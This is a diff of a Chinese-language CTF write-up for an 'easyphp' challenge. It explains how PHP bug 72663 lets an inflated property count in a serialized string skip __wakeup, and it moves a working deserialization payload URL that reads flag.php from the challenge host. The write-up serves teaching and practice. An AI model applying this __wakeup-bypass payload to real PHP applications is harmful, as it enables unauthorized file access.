@@ -133,9 +133,11 @@ index.php
 
 这里涉及的另一个知识，是php本身的一个bug，详细信息可以查询[`php bug 72663`](https://www.baidu.com/s?wd=php%20bug%2072663)，这个 bug 的原理是：当反序列化字符串中，表示**属性个数的值大于真实属性个数**时，会跳过`__wakeup` 函数的执行。
 
-于是Payload如下：
-
-	http://120.55.43.255:13005/index.php?class=O:4:"hint":2:{s:4:"file";s:8:"flag.php";}
+于是将hint值改为2
 
 ![](./index_files/ichunqiuCTF_easyphp.png)
+
+Payload：
+
+	http://120.55.43.255:13005/index.php?class=O:4:"hint":2:{s:4:"file";s:8:"flag.php";}
 
